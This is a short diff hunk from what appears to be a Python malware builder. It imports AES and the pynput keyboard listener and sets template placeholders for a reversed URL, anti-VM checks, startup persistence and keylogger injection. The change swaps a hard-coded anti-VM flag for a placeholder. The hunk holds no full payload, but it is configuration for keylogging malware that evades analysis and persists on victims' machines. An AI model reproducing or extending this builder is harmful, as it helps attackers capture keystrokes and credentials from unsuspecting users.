@@ -7,7 +7,7 @@ from Crypto.Cipher import AES
 from pynput import keyboard
 
 UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
-Anti_Vm = "false"
+Anti_Vm = "%AnTiVm%"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
 injectKeylogger = "%keyloggerinject???%"
